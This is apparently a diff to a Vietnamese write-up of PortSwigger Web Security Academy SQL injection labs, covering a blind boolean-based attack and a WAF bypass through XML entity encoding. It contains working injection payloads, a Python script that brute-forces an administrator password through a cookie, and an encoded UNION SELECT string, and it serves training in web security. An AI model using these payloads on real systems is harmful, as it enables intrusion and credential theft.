@@ -346,4 +346,116 @@ Vậy là nó hoàn toàn hoạt động đúng , và bây giờ sử dụng pay
 ```sql
 ' or substring((select password from users where username = 'administrator'),1,1) =  'a'--
 ```
-Add to instruder , rồi add 2 kí tự `a` và `1` , burpforce
+Add to instruder , rồi add 2 kí tự `a` và `1` và điều chỉnh setting như thế này
+
+<img width="1920" height="564" alt="image" src="https://github.com/user-attachments/assets/5d5fc406-2faa-4ddb-915e-3dad8dec98c1" />
+
+Và 
+
+<img width="1920" height="501" alt="image" src="https://github.com/user-attachments/assets/7d0995e9-6c8f-4e73-aee4-c5d0e08e9286" />
+
+Chọn Cluster Bomb attack và Start Attack
+
+Và bạn nhận được kết quả như thế này , sử dụng độ dài response trả về làm thứ để xác định 
+
+<img width="1830" height="334" alt="image" src="https://github.com/user-attachments/assets/9352e9b6-a632-4fd4-891f-4db95cdcca9b" />
+
+Chúng ta được password: `347szh05698lrtunn0xu`
+
+Hoặc ở đây bạn có thể tự viết script python như thế này
+```python
+import requests
+import re
+
+url ="https://0aaa00fd03a1fabb8261760b008e00eb.web-security-academy.net/filter?category=Gifts"
+
+alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
+
+cookies = {'TrackingId':'fknK8gOwIEOgCAei','session':'OMQAtNF9W0esea1xaaqjJnN0fOeAsyQX'}
+
+secret =""
+for i in range(1,21,1):
+	for j in alphabet:
+		sql =f"substring((select password from users where username = 'administrator'),{i},1) =  '{j}'"
+
+		payload = f"' or {sql} --"
+
+		cookies["TrackingId"] = payload
+
+		res = requests.get(url,cookies=cookies)
+
+		result = re.search("Welcome back!",res.text)
+
+		if result:
+			secret = secret +j
+			break
+
+print( secret )
+```
+Và kết quả cũng được tương tự 
+
+<img width="237" height="65" alt="image" src="https://github.com/user-attachments/assets/cc1fc9bd-16bc-4bae-ba0f-e138bd14730a" />
+
+
+Và chúng ta solved được Challenge này!!
+
+<img width="1478" height="540" alt="image" src="https://github.com/user-attachments/assets/7a74682d-6d3e-42f7-ae01-0d452acf1f9e" />
+
+
+# Lab 16: SQL injection with filter bypass via XML encoding
+
+<img width="1129" height="516" alt="image" src="https://github.com/user-attachments/assets/5eb0bf29-eb48-4b86-8c19-ab2da9d3a5d6" />
+
+Theo mô tả của challenge thì tồn tại một lỗ hổng SQLi ở trong mục kiểm tra tồn kho , chức năng này sử dụng truy vấn SQL để trả về kết quả và in ra màn hình web
+
+<img width="1448" height="461" alt="image" src="https://github.com/user-attachments/assets/4b031990-772c-4681-ae3f-611a2486512b" />
+
+Đây chính là nó , cái kiểm tra tồn kho
+
+Chúng ta bắt thử request của nó 
+
+<img width="1491" height="657" alt="image" src="https://github.com/user-attachments/assets/74656513-480e-4014-b52f-e05e90ef2971" />
+
+
+Lưu ý ở đây: cái chức năng check tồn kho nó gửi thông tin đến `<storeId>` 
+
+Và một cái nữa chính là vì ở đây storeId là số chứ không phải string nên chúng ta không cần dùng dấu nháy để đóng mà ghi tiếp câu lệnh cần phía sau luôn 
+
+Mình thử xác định số cột nhưng bất kể như nào nó cũng báo `Attack detected` , vậy tức là ở đây nó có WAF các chữ nguy hiểm như UNION , SELECT ,....
+
+Mình có thử nghĩ cách bypass = hex nhưng mà mới nhớ SQL nó chỉ hex được cái dữ liệu chứ không hex được hoàn toàn câu lệnh 
+
+Giả sử 
+```sql
+0x53454C454354 * FROM users
+```
+MySQL nó không thể hiểu `0x53454C454354` là Select 
+
+Nhưng Ở đây có 2 engine riêng để xử lý từng ngôn ngữ riêng , theo bài thì có sử dụng cả XML thì tất nhiên cũng phải có XML engine riêng để xử lý dữ liệu được viết bằng ngôn ngữ của nó
+
+Và trên hết , XML engine nó có thể dịch được những mã hex đó , giả sử 0x65 thì MySQL có thể hiểu đó là chữ A , thì &#65; thì XML có thể hiểu đó chữ A , và quan trọng là nó dịch hết , không kể đó là Lệnh hay Dữ liệu gì cả. Chỉ cần thêm tiền tố `&#` ở đầu mã hex và dấu `;` ở cuối mã hex 
+
+Lúc này chúng ta cần
+```sql
+union select username from users--
+```
+chuyển thành 
+```
+&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x66;&#x72;&#x6f;&#x6d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x2d;&#x2d;
+```
+và kết quả là tìm thấy được administrator
+<img width="1490" height="764" alt="image" src="https://github.com/user-attachments/assets/de780680-0a51-4d54-9b0e-acc7aa324280" />
+
+payload cuối cùng để lấy password của administrator
+```
+union select password from users where username = 'administrator'--
+```
+Chúng ta được password 
+
+<img width="1497" height="819" alt="image" src="https://github.com/user-attachments/assets/747f68be-111a-4e70-a716-98b9af4894f8" />
+
+Lấy nó và Login thôi !
+
+<img width="1484" height="713" alt="image" src="https://github.com/user-attachments/assets/d1bdcdf7-30dc-4102-aaf7-e6b3a463b173" />
+
+Chúng ta Solved được Challenge này!
